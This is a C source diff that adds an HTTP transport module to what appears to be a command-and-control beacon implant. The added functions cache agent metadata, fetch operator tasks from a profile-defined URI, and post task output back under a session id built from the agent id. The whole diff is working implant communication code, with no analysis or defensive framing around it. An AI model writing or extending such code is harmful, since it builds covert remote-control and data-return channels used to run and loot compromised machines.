@@ -7,6 +7,60 @@
 #include <curl/curl.h>
 #include "debug.h"
 
+static uint8_t *g_cached_metadata = NULL;
+static size_t g_cached_metadata_len = 0;
+
+// Transport interface implementation
+int http_transport_init(beacon_state_t *state) {
+    (void)state;
+    return 0;
+}
+
+int http_transport_send_metadata(beacon_state_t *state, const uint8_t *data, size_t len) {
+    (void)state;
+    if (g_cached_metadata) free(g_cached_metadata);
+    g_cached_metadata = malloc(len);
+    if (!g_cached_metadata) return -1;
+    memcpy(g_cached_metadata, data, len);
+    g_cached_metadata_len = len;
+    return 0;
+}
+
+int http_transport_receive_tasks(beacon_state_t *state, uint8_t **tasks, size_t *tasks_len) {
+    (void)state;
+    http_response_t response;
+    int ret = http_get(profile_get_http_get_uri(), g_cached_metadata, g_cached_metadata_len, &response);
+    
+    if (ret == 0 && response.data && response.size > 0) {
+        *tasks = (uint8_t *)response.data;
+        *tasks_len = response.size;
+        // Don't free response.data here, caller will free *tasks
+    } else {
+        *tasks = NULL;
+        *tasks_len = 0;
+        http_response_free(&response);
+    }
+    
+    return ret;
+}
+
+int http_transport_send_output(beacon_state_t *state, const uint8_t *data, size_t len) {
+    http_response_t response;
+    char session_id[33];
+    snprintf(session_id, sizeof(session_id), "%u", state->agent_id);
+    
+    int ret = http_post(profile_get_http_post_uri(), data, len, session_id, &response);
+    http_response_free(&response);
+    return ret;
+}
+
+void http_transport_cleanup(void) {
+    if (g_cached_metadata) {
+        free(g_cached_metadata);
+        g_cached_metadata = NULL;
+    }
+}
+
 // Callback for CURL to write response data
 static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
     size_t real_size = size * nmemb;
